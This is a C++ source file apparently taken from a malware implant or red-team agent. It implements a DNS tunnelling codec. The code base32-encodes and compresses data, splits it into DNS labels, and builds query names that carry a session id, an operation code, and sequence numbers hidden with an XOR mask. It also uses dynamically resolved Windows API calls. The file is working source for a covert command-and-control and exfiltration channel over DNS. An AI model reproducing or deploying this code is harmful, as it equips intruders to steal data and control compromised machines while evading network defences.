#include "DnsCodec.h"
#include "main.h"
#include "utils.h"

#define MINIZ_NO_STDIO
#include "miniz.h"

// Static constant definitions
const CHAR DnsCodec::kBase32Alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

const int DnsCodec::kBase64DecodeTable[] = {
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
    -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1
};

void DnsCodec::ToHex32(ULONG value, CHAR out[9])
{
    static const CHAR hex[] = "0123456789abcdef";
    for (int i = 7; i >= 0; --i) {
        out[i] = hex[value & 0x0F];
        value >>= 4;
    }
    out[8] = '\0';
}

ULONG DnsCodec::Base32Encode(const BYTE* src, ULONG srcLen, CHAR* dst, ULONG dstSize)
{
    if (!src || !dst || !srcLen || !dstSize)
        return 0;

    // Calculate max output size: ceil(srcLen * 8 / 5)
    ULONG maxOut = (srcLen * 8 + 4) / 5;
    if (maxOut >= dstSize)
        return 0;

    ULONG bitBuffer = 0;
    int   bitCount = 0;
    ULONG outLen = 0;

    for (ULONG i = 0; i < srcLen; ++i) {
        bitBuffer = (bitBuffer << 8) | src[i];
        bitCount += 8;
        while (bitCount >= 5) {
            bitCount -= 5;
            dst[outLen++] = kBase32Alphabet[(bitBuffer >> bitCount) & 0x1F];
        }
    }

    if (bitCount > 0)
        dst[outLen++] = kBase32Alphabet[(bitBuffer << (5 - bitCount)) & 0x1F];

    dst[outLen] = '\0';
    return outLen;
}

ULONG DnsCodec::Base32Decode(const CHAR* src, ULONG srcLen, BYTE* dst, ULONG dstSize)
{
    if (!src || !dst || !srcLen || !dstSize)
        return 0;

    ULONG bitBuffer = 0;
    int   bitCount = 0;
    ULONG outLen = 0;

    for (ULONG i = 0; i < srcLen; ++i) {
        CHAR c = src[i];
        int val = -1;

        if (c >= 'A' && c <= 'Z')
            val = c - 'A';
        else if (c >= 'a' && c <= 'z')
            val = c - 'a';
        else if (c >= '2' && c <= '7')
            val = c - '2' + 26;
        else
            continue;

        bitBuffer = (bitBuffer << 5) | val;
        bitCount += 5;

        while (bitCount >= 8) {
            bitCount -= 8;
            if (outLen >= dstSize)
                return 0;
            dst[outLen++] = (BYTE)((bitBuffer >> bitCount) & 0xFF);
        }
    }

    return outLen;
}

int DnsCodec::Base64Decode(const CHAR* src, int srcLen, BYTE* dst, int dstMax)
{
    if (!src || !dst || srcLen <= 0 || dstMax <= 0)
        return 0;

    int j = 0;
    int val = 0;
    int valb = -8;

    for (int i = 0; i < srcLen; i++) {
        unsigned char c = src[i];
        if (c > 127) continue;
        int d = kBase64DecodeTable[c];
        if (d == -1) continue;

        val = (val << 6) | d;
        valb += 6;
        if (valb >= 0) {
            if (j < dstMax) dst[j++] = (BYTE)((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return j;
}

void DnsCodec::BuildQName(const CHAR* sid, const CHAR* op, ULONG seq, ULONG idx, const CHAR* dataLabel, const CHAR* domain, CHAR* out, ULONG outSize)
{
    CHAR seqHex[9];
    CHAR idxHex[9];

    ToHex32(seq ^ kSeqXorMask, seqHex);
    ToHex32(idx ^ kSeqXorMask, idxHex);

    const CHAR* dataPart = (dataLabel && dataLabel[0]) ? dataLabel : "x";
    const CHAR* domPart = (domain && domain[0]) ? domain : "";

    if (domPart[0])
        ApiWin->snprintf(out, outSize, "%s.%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart, domPart);
    else
        ApiWin->snprintf(out, outSize, "%s.%s.%s.%s.%s", sid, op, seqHex, idxHex, dataPart);
}

int DnsCodec::EncodeName(const CHAR* host, BYTE* buf, int bufSize)
{
    if (!host || !buf || bufSize <= 1)
        return -1;

    int len = 0;
    const CHAR* p = host;

    while (*p) {
        const CHAR* labelStart = p;
        int labelLen = 0;

        while (*p && *p != '.') {
            ++p;
            ++labelLen;
        }

        if (labelLen == 0)
            break;
        if (labelLen > (int)kMaxLabelSize)
            labelLen = (int)kMaxLabelSize;

        if (len + 1 + labelLen + 1 > bufSize)
            return -1;

        buf[len++] = (BYTE)labelLen;
        memcpy(buf + len, labelStart, labelLen);
        len += labelLen;

        if (*p == '.')
            ++p;
    }

    if (len + 1 > bufSize)
        return -1;
    buf[len++] = 0;
    return len;
}

// Build data labels for DNS query
BOOL DnsCodec::BuildDataLabels(const BYTE* src, ULONG srcLen, ULONG labelSize, CHAR* out, ULONG outSize)
{
    if (!src || !srcLen || !out || !labelSize || labelSize > kMaxLabelSize || outSize == 0)
        return FALSE;

    CHAR encoded[kBase32BufSize];
    ULONG encLen = Base32Encode(src, srcLen, encoded, sizeof(encoded));
    if (encLen == 0)
        return FALSE;

    // Calculate required output size: encLen + (encLen / labelSize) dots + null
    ULONG numLabels = (encLen + labelSize - 1) / labelSize;
    ULONG requiredSize = encLen + (numLabels > 1 ? numLabels - 1 : 0) + 1;
    if (requiredSize > outSize)
        return FALSE;

    ULONG written = 0;
    ULONG i = 0;
    while (i < encLen) {
        ULONG chunk = (encLen - i > labelSize) ? labelSize : encLen - i;
        memcpy(out + written, encoded + i, chunk);
        written += chunk;
        i += chunk;
        if (i < encLen)
            out[written++] = '.';
    }
    out[written] = '\0';
    return TRUE;
}

// Compression using miniz (zlib)
BOOL DnsCodec::Compress(const BYTE* inBuf, ULONG inLen, BYTE** outBuf, ULONG* outLen)
{
    if (!inBuf || !outBuf || !outLen || inLen == 0)
        return FALSE;

    mz_ulong srcLen = (mz_ulong)inLen;
    mz_ulong bound = compressBound(srcLen);
    if (bound == 0)
        return FALSE;

    BYTE* tmp = (BYTE*)MemAllocLocal((ULONG)bound);
    if (!tmp)
        return FALSE;

    mz_ulong destLen = bound;
    int res = compress2(tmp, &destLen, (const unsigned char*)inBuf, srcLen, Z_BEST_COMPRESSION);
    if (res != Z_OK || destLen == 0 || destLen >= srcLen) {
        MemFreeLocal((LPVOID*)&tmp, (ULONG)bound);
        return FALSE;
    }

    *outBuf = tmp;
    *outLen = (ULONG)destLen;
    return TRUE;
}

// Decompression using miniz (zlib)
BOOL DnsCodec::Decompress(const BYTE* inBuf, ULONG inLen, BYTE** outBuf, ULONG expectedLen)
{
    if (!inBuf || !outBuf || expectedLen == 0 || inLen == 0)
        return FALSE;

    BYTE* tmp = (BYTE*)MemAllocLocal(expectedLen);
    if (!tmp)
        return FALSE;

    mz_ulong destLen = (mz_ulong)expectedLen;
    int res = uncompress(tmp, &destLen, (const unsigned char*)inBuf, (mz_ulong)inLen);
    if (res != Z_OK || destLen != (mz_ulong)expectedLen) {
        MemFreeLocal((LPVOID*)&tmp, expectedLen);
        return FALSE;
    }

    *outBuf = tmp;
    return TRUE;
}